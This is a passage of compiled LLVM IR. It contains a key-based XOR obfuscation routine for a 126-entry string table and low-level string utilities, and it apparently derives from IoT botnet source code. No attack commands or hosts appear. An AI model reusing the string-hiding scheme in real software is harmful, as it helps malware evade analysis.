; <label>:7:                                      ; preds = %.lr.ph
  %8 = icmp sgt i32 %.012, 1
  br i1 %8, label %9, label %.backedge.thread

; <label>:9:                                      ; preds = %7
  %10 = bitcast i8* %.01011 to i16*
  store i16 0, i16* %10, align 2
  br label %.backedge

.backedge:                                        ; preds = %9, %5
  %.sink14 = phi i64 [ 2, %9 ], [ 4, %5 ]
  %.sink = phi i32 [ -2, %9 ], [ -4, %5 ]
  %11 = getelementptr inbounds i8, i8* %.01011, i64 %.sink14
  %12 = add i32 %.012, %.sink
  %13 = icmp sgt i32 %12, 0
  br i1 %13, label %.lr.ph, label %._crit_edge.loopexit

.backedge.thread:                                 ; preds = %7
  store i8 0, i8* %.01011, align 1
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.backedge.thread, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_unlock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define internal fastcc void @toggle_obf(i8 zeroext) unnamed_addr #9 {
  %2 = zext i8 %0 to i64
  %3 = load i32, i32* @table_key, align 4
  %4 = lshr i32 %3, 8
  %5 = lshr i32 %3, 16
  %6 = lshr i32 %3, 24
  %7 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %2, i32 1
  %8 = load i16, i16* %7, align 8
  %9 = icmp eq i16 %8, 0
  br i1 %9, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %10 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %2, i32 0
  br label %11

; <label>:11:                                     ; preds = %.lr.ph, %11
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %11 ]
  %12 = load i8*, i8** %10, align 16
  %13 = getelementptr inbounds i8, i8* %12, i64 %indvars.iv
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = xor i32 %15, %3
  %17 = trunc i32 %16 to i8
  store i8 %17, i8* %13, align 1
  %18 = load i8*, i8** %10, align 16
  %19 = getelementptr inbounds i8, i8* %18, i64 %indvars.iv
  %20 = load i8, i8* %19, align 1
  %21 = zext i8 %20 to i32
  %22 = xor i32 %21, %4
  %23 = trunc i32 %22 to i8
  store i8 %23, i8* %19, align 1
  %24 = load i8*, i8** %10, align 16
  %25 = getelementptr inbounds i8, i8* %24, i64 %indvars.iv
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = xor i32 %27, %5
  %29 = trunc i32 %28 to i8
  store i8 %29, i8* %25, align 1
  %30 = load i8*, i8** %10, align 16
  %31 = getelementptr inbounds i8, i8* %30, i64 %indvars.iv
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = xor i32 %33, %6
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* %31, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %36 = load i16, i16* %7, align 8
  %37 = zext i16 %36 to i64
  %38 = icmp slt i64 %indvars.iv.next, %37
  br i1 %38, label %11, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %11
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @table_lock_val(i8 zeroext) local_unnamed_addr #9 {
  tail call fastcc void @toggle_obf(i8 zeroext %0)
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #9 {
  %3 = sext i32 %0 to i64
  %4 = icmp eq i32* %1, null
  br i1 %4, label %9, label %5

; <label>:5:                                      ; preds = %2
  %6 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %3, i32 1
  %7 = load i16, i16* %6, align 8
  %8 = zext i16 %7 to i32
  store i32 %8, i32* %1, align 4
  br label %9

; <label>:9:                                      ; preds = %2, %5
  %10 = getelementptr inbounds [126 x %struct.table_value], [126 x %struct.table_value]* @table, i64 0, i64 %3, i32 0
  %11 = load i8*, i8** %10, align 16
  ret i8* %11
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_strlen(i8* nocapture readonly) local_unnamed_addr #5 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.03 = phi i32 [ %5, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i8* [ %4, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %4 = getelementptr inbounds i8, i8* %.012, i64 1
  %5 = add nuw nsw i32 %.03, 1
  %6 = load i8, i8* %4, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i32 [ 0, %1 ], [ %5, %._crit_edge.loopexit ]
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define signext i8 @util_strncmp(i8* nocapture readonly, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %4 = tail call i32 @util_strlen(i8* %0)
  %5 = tail call i32 @util_strlen(i8* %1)
  %6 = icmp slt i32 %4, %2
  %7 = icmp slt i32 %5, %2
  %or.cond = or i1 %6, %7
  br i1 %or.cond, label %.loopexit, label %.preheader.preheader

.preheader.preheader:                             ; preds = %3
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %9
  %.011 = phi i8* [ %13, %9 ], [ %1, %.preheader.preheader ]
  %.010 = phi i32 [ %10, %9 ], [ %2, %.preheader.preheader ]
  %.09 = phi i8* [ %11, %9 ], [ %0, %.preheader.preheader ]
  %8 = icmp eq i32 %.010, 0
  br i1 %8, label %.loopexit.loopexit, label %9

; <label>:9:                                      ; preds = %.preheader
  %10 = add nsw i32 %.010, -1
  %11 = getelementptr inbounds i8, i8* %.09, i64 1
  %12 = load i8, i8* %.09, align 1
  %13 = getelementptr inbounds i8, i8* %.011, i64 1
  %14 = load i8, i8* %.011, align 1
  %15 = icmp eq i8 %12, %14
  br i1 %15, label %.preheader, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %9, %.preheader
  %.0.ph = phi i8 [ 1, %.preheader ], [ 0, %9 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %3
  %.0 = phi i8 [ 0, %3 ], [ %.0.ph, %.loopexit.loopexit ]
  ret i8 %.0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define signext i8 @util_strcmp(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #5 {
  %3 = tail call i32 @util_strlen(i8* %0)
  %4 = tail call i32 @util_strlen(i8* %1)
  %5 = icmp eq i32 %3, %4
  br i1 %5, label %.preheader.preheader, label %.loopexit

.preheader.preheader:                             ; preds = %2
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %7
  %.09 = phi i8* [ %9, %7 ], [ %0, %.preheader.preheader ]
  %.08 = phi i8* [ %11, %7 ], [ %1, %.preheader.preheader ]
  %.07 = phi i32 [ %8, %7 ], [ %3, %.preheader.preheader ]
  %6 = icmp eq i32 %.07, 0
  br i1 %6, label %.loopexit.loopexit, label %7

; <label>:7:                                      ; preds = %.preheader
  %8 = add nsw i32 %.07, -1
  %9 = getelementptr inbounds i8, i8* %.09, i64 1
  %10 = load i8, i8* %.09, align 1
  %11 = getelementptr inbounds i8, i8* %.08, i64 1
  %12 = load i8, i8* %.08, align 1
  %13 = icmp eq i8 %10, %12
  br i1 %13, label %.preheader, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %7, %.preheader
  %.0.ph = phi i8 [ 1, %.preheader ], [ 0, %7 ]
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %2
  %.0 = phi i8 [ 0, %2 ], [ %.0.ph, %.loopexit.loopexit ]
  ret i8 %.0
}

; Function Attrs: noinline norecurse nounwind uwtable
define i32 @util_strcpy(i8* nocapture, i8* nocapture readonly) local_unnamed_addr #9 {
  %3 = tail call i32 @util_strlen(i8* %1)
  %4 = add nsw i32 %3, 1
  tail call void @util_memcpy(i8* %0, i8* %1, i32 %4)
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_memcpy(i8* nocapture, i8* nocapture readonly, i32) local_unnamed_addr #9 {
  %4 = icmp eq i32 %2, 0
  br i1 %4, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  %5 = add i32 %2, -1
  %xtraiter = and i32 %2, 7
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph.prol.loopexit, label %.lr.ph.prol.preheader

.lr.ph.prol.preheader:                            ; preds = %.lr.ph.preheader
  br label %.lr.ph.prol

.lr.ph.prol:                                      ; preds = %.lr.ph.prol, %.lr.ph.prol.preheader
  %.08.prol = phi i8* [ %7, %.lr.ph.prol ], [ %1, %.lr.ph.prol.preheader ]
  %.047.prol = phi i8* [ %9, %.lr.ph.prol ], [ %0, %.lr.ph.prol.preheader ]
  %.056.prol = phi i32 [ %6, %.lr.ph.prol ], [ %2, %.lr.ph.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph.prol ], [ %xtraiter, %.lr.ph.prol.preheader ]
  %6 = add nsw i32 %.056.prol, -1
  %7 = getelementptr inbounds i8, i8* %.08.prol, i64 1
  %8 = load i8, i8* %.08.prol, align 1
  %9 = getelementptr inbounds i8, i8* %.047.prol, i64 1
  store i8 %8, i8* %.047.prol, align 1
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph.prol.loopexit.unr-lcssa, label %.lr.ph.prol, !llvm.loop !6

.lr.ph.prol.loopexit.unr-lcssa:                   ; preds = %.lr.ph.prol
  br label %.lr.ph.prol.loopexit

.lr.ph.prol.loopexit:                             ; preds = %.lr.ph.preheader, %.lr.ph.prol.loopexit.unr-lcssa
  %.08.unr = phi i8* [ %1, %.lr.ph.preheader ], [ %7, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.047.unr = phi i8* [ %0, %.lr.ph.preheader ], [ %9, %.lr.ph.prol.loopexit.unr-lcssa ]
  %.056.unr = phi i32 [ %2, %.lr.ph.preheader ], [ %6, %.lr.ph.prol.loopexit.unr-lcssa ]
  %10 = icmp ult i32 %5, 7
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph.preheader.new

.lr.ph.preheader.new:                             ; preds = %.lr.ph.prol.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph, %.lr.ph.preheader.new
  %.08 = phi i8* [ %.08.unr, %.lr.ph.preheader.new ], [ %33, %.lr.ph ]
  %.047 = phi i8* [ %.047.unr, %.lr.ph.preheader.new ], [ %35, %.lr.ph ]
  %.056 = phi i32 [ %.056.unr, %.lr.ph.preheader.new ], [ %32, %.lr.ph ]
  %11 = getelementptr inbounds i8, i8* %.08, i64 1
  %12 = load i8, i8* %.08, align 1
  %13 = getelementptr inbounds i8, i8* %.047, i64 1
  store i8 %12, i8* %.047, align 1
  %14 = getelementptr inbounds i8, i8* %.08, i64 2
  %15 = load i8, i8* %11, align 1
  %16 = getelementptr inbounds i8, i8* %.047, i64 2
  store i8 %15, i8* %13, align 1
  %17 = getelementptr inbounds i8, i8* %.08, i64 3
  %18 = load i8, i8* %14, align 1
  %19 = getelementptr inbounds i8, i8* %.047, i64 3
  store i8 %18, i8* %16, align 1
  %20 = getelementptr inbounds i8, i8* %.08, i64 4
  %21 = load i8, i8* %17, align 1
  %22 = getelementptr inbounds i8, i8* %.047, i64 4
  store i8 %21, i8* %19, align 1
  %23 = getelementptr inbounds i8, i8* %.08, i64 5
  %24 = load i8, i8* %20, align 1
  %25 = getelementptr inbounds i8, i8* %.047, i64 5
  store i8 %24, i8* %22, align 1
  %26 = getelementptr inbounds i8, i8* %.08, i64 6
  %27 = load i8, i8* %23, align 1
  %28 = getelementptr inbounds i8, i8* %.047, i64 6
  store i8 %27, i8* %25, align 1
  %29 = getelementptr inbounds i8, i8* %.08, i64 7
  %30 = load i8, i8* %26, align 1
  %31 = getelementptr inbounds i8, i8* %.047, i64 7
  store i8 %30, i8* %28, align 1
  %32 = add nsw i32 %.056, -8
  %33 = getelementptr inbounds i8, i8* %.08, i64 8
  %34 = load i8, i8* %29, align 1
  %35 = getelementptr inbounds i8, i8* %.047, i64 8
  store i8 %34, i8* %31, align 1
  %36 = icmp eq i32 %32, 0
  br i1 %36, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph

._crit_edge.loopexit.unr-lcssa:                   ; preds = %.lr.ph
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @util_zero(i8* nocapture, i32) local_unnamed_addr #9 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %._crit_edge, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %2
  %4 = add i32 %1, -1
  %5 = zext i32 %4 to i64
  %6 = add nuw nsw i64 %5, 1
  call void @llvm.memset.p0i8.i64(i8* %0, i8 0, i64 %6, i32 1, i1 false)
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_atoi(i8* nocapture readonly, i32) local_unnamed_addr #5 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %.0 = phi i8* [ %0, %2 ], [ %4, %3 ]
  %4 = getelementptr inbounds i8, i8* %.0, i64 1
  %5 = load i8, i8* %.0, align 1
  %6 = tail call fastcc i32 @util_isspace(i8 signext %5)
  %7 = icmp eq i32 %6, 0
  br i1 %7, label %8, label %3

; <label>:8:                                      ; preds = %3
  switch i8 %5, label %12 [
    i8 45, label %9
    i8 43, label %.sink.split
  ]

; <label>:9:                                      ; preds = %8
  br label %.sink.split

.sink.split:                                      ; preds = %8, %9
  %.034.ph = phi i1 [ true, %9 ], [ false, %8 ]
  %10 = getelementptr inbounds i8, i8* %.0, i64 2
  %11 = load i8, i8* %4, align 1
  br label %12

; <label>:12:                                     ; preds = %8, %.sink.split
  %.035.in = phi i8 [ %11, %.sink.split ], [ %5, %8 ]
  %.034 = phi i1 [ %.034.ph, %.sink.split ], [ false, %8 ]
  %.1 = phi i8* [ %10, %.sink.split ], [ %4, %8 ]
  %13 = select i1 %.034, i64 -9223372036854775808, i64 9223372036854775807
  %14 = sext i32 %1 to i64
  %15 = urem i64 %13, %14
  %16 = trunc i64 %15 to i32
  %17 = udiv i64 %13, %14
  br label %18

; <label>:18:                                     ; preds = %43, %12
  %.038 = phi i64 [ 0, %12 ], [ %.139, %43 ]
  %.136.in = phi i8 [ %.035.in, %12 ], [ %45, %43 ]
  %.032 = phi i32 [ 0, %12 ], [ %.133, %43 ]
  %.2 = phi i8* [ %.1, %12 ], [ %44, %43 ]
  %.136 = sext i8 %.136.in to i32
  %19 = tail call fastcc i32 @util_isdigit(i8 signext %.136.in)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %23, label %21

; <label>:21:                                     ; preds = %18
  %22 = add nsw i32 %.136, -48
  br label %31

; <label>:23:                                     ; preds = %18
  %24 = tail call fastcc i32 @util_isalpha(i8 signext %.136.in)
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %46, label %26

; <label>:26:                                     ; preds = %23
  %27 = tail call fastcc i32 @util_isupper(i8 signext %.136.in)
  %28 = icmp ne i32 %27, 0
  %29 = select i1 %28, i32 55, i32 87
  %30 = sub nsw i32 %.136, %29
  br label %31

; <label>:31:                                     ; preds = %26, %21
  %.237 = phi i32 [ %22, %21 ], [ %30, %26 ]
  %32 = icmp slt i32 %.237, %1
  br i1 %32, label %33, label %46

; <label>:33:                                     ; preds = %31
  %34 = icmp slt i32 %.032, 0
  %35 = icmp ugt i64 %.038, %17
  %or.cond = or i1 %35, %34
  br i1 %or.cond, label %43, label %36

; <label>:36:                                     ; preds = %33
  %37 = icmp eq i64 %.038, %17
  %38 = icmp sgt i32 %.237, %16
  %or.cond41 = and i1 %37, %38
  br i1 %or.cond41, label %43, label %39

; <label>:39:                                     ; preds = %36
  %40 = mul i64 %.038, %14
  %41 = sext i32 %.237 to i64
  %42 = add i64 %41, %40
  br label %43

; <label>:43:                                     ; preds = %33, %36, %39
  %.139 = phi i64 [ %42, %39 ], [ %.038, %36 ], [ %.038, %33 ]
  %.133 = phi i32 [ 1, %39 ], [ -1, %36 ], [ -1, %33 ]
  %44 = getelementptr inbounds i8, i8* %.2, i64 1
  %45 = load i8, i8* %.2, align 1
  br label %18

; <label>:46:                                     ; preds = %31, %23
  %47 = icmp slt i32 %.032, 0
  %48 = sub i64 0, %.038
  %..038 = select i1 %.034, i64 %48, i64 %.038
  %.240 = select i1 %47, i64 %13, i64 %..038
  %49 = trunc i64 %.240 to i32
  ret i32 %49
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isspace(i8 signext) unnamed_addr #8 {
  switch i8 %0, label %2 [
    i8 32, label %3
    i8 9, label %3
    i8 10, label %3
  ]

; <label>:2:                                      ; preds = %1
  br label %3

; <label>:3:                                      ; preds = %1, %1, %1, %2
  %4 = phi i32 [ 1, %1 ], [ 0, %2 ], [ 1, %1 ], [ 1, %1 ]
  ret i32 %4
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isdigit(i8 signext) unnamed_addr #8 {
  %.off = add i8 %0, -48
  %2 = icmp ult i8 %.off, 10
  %3 = zext i1 %2 to i32
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isalpha(i8 signext) unnamed_addr #8 {
  %2 = and i8 %0, -33
  %3 = add i8 %2, -65
  %4 = icmp ult i8 %3, 26
  %5 = zext i1 %4 to i32
  ret i32 %5
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isupper(i8 signext) unnamed_addr #8 {
  %.off = add i8 %0, -65
  %2 = icmp ult i8 %.off, 26
  %3 = zext i1 %2 to i32
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #9 {
  %4 = alloca [34 x i8], align 16
  %5 = icmp eq i8* %2, null
  br i1 %5, label %33, label %6

; <label>:6:                                      ; preds = %3
  %7 = icmp eq i32 %0, 0
  br i1 %7, label %31, label %8

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 33
  store i8 0, i8* %9, align 1
  %10 = icmp eq i32 %1, 10
  %11 = icmp slt i32 %0, 0
  %or.cond = and i1 %11, %10
  %12 = sub nsw i32 0, %0
  %.29 = select i1 %or.cond, i32 %12, i32 %0
  %13 = icmp eq i32 %.29, 0
  br i1 %13, label %select.unfold._crit_edge, label %select.unfold.preheader

select.unfold.preheader:                          ; preds = %8
  br label %select.unfold

select.unfold:                                    ; preds = %select.unfold.preheader, %select.unfold
  %indvars.iv = phi i64 [ %indvars.iv.next, %select.unfold ], [ 32, %select.unfold.preheader ]
  %.031 = phi i32 [ %19, %select.unfold ], [ %.29, %select.unfold.preheader ]
  %14 = urem i32 %.031, %1
  %15 = icmp slt i32 %14, 10
  %.sink = select i1 %15, i32 48, i32 55
  %16 = add nsw i32 %.sink, %14
  %17 = trunc i32 %16 to i8
  %18 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %indvars.iv
  store i8 %17, i8* %18, align 1
  %19 = udiv i32 %.031, %1
  %indvars.iv.next = add i64 %indvars.iv, -1
  %20 = icmp ult i32 %.031, %1
  br i1 %20, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  %21 = trunc i64 %indvars.iv.next to i32
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %8
  %.025.lcssa = phi i32 [ 32, %8 ], [ %21, %select.unfold._crit_edge.loopexit ]
  %.demorgan = and i1 %11, %10
  br i1 %.demorgan, label %22, label %25

; <label>:22:                                     ; preds = %select.unfold._crit_edge
  %23 = sext i32 %.025.lcssa to i64
  %24 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %23
  store i8 45, i8* %24, align 1
  br label %27

; <label>:25:                                     ; preds = %select.unfold._crit_edge
  %26 = add nsw i32 %.025.lcssa, 1
  br label %27

; <label>:27:                                     ; preds = %25, %22
  %.1 = phi i32 [ %.025.lcssa, %22 ], [ %26, %25 ]
  %28 = sext i32 %.1 to i64
  %29 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %28
  %30 = call i32 @util_strcpy(i8* nonnull %2, i8* %29)
  br label %33

; <label>:31:                                     ; preds = %6
  store i8 48, i8* %2, align 1
  %32 = getelementptr inbounds i8, i8* %2, i64 1
  store i8 0, i8* %32, align 1
  br label %33

; <label>:33:                                     ; preds = %27, %31, %3
  %.027 = phi i8* [ null, %3 ], [ %2, %31 ], [ %2, %27 ]
  ret i8* %.027
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_stristr(i8*, i32, i8* nocapture readonly) local_unnamed_addr #5 {
  %4 = tail call i32 @util_strlen(i8* %2)
  %5 = icmp sgt i32 %1, 0
  br i1 %5, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.in = phi i32 [ %6, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.026 = phi i32 [ %.0.be, %.backedge ], [ 0, %.lr.ph.preheader ]
  %.02125 = phi i8* [ %7, %.backedge ], [ %0, %.lr.ph.preheader ]
  %6 = add nsw i32 %.in, -1
  %7 = getelementptr inbounds i8, i8* %.02125, i64 1
  %8 = load i8, i8* %.02125, align 1
  %9 = sext i32 %.026 to i64
  %10 = getelementptr inbounds i8, i8* %2, i64 %9
  %11 = load i8, i8* %10, align 1
  %.off = add i8 %8, -65
  %12 = icmp ult i8 %.off, 26
  %13 = or i8 %8, 96
  %14 = select i1 %12, i8 %13, i8 %8
  %.off24 = add i8 %11, -65
  %15 = icmp ult i8 %.off24, 26
  %16 = or i8 %11, 96
  %17 = select i1 %15, i8 %16, i8 %11
  %18 = icmp eq i8 %14, %17
  br i1 %18, label %19, label %.backedge

; <label>:19:                                     ; preds = %.lr.ph
  %20 = add nsw i32 %.026, 1
  %21 = icmp eq i32 %20, %4
  br i1 %21, label %23, label %.backedge

.backedge:                                        ; preds = %19, %.lr.ph
  %.0.be = phi i32 [ %20, %19 ], [ 0, %.lr.ph ]
  %22 = icmp sgt i32 %.in, 1
  br i1 %22, label %.lr.ph, label %.loopexit.loopexit

; <label>:23:                                     ; preds = %19
  %24 = ptrtoint i8* %7 to i64
  %25 = ptrtoint i8* %0 to i64
  %26 = sub i64 %24, %25
  %27 = trunc i64 %26 to i32
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %3, %23
  %.020 = phi i32 [ %27, %23 ], [ -1, %3 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.020
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
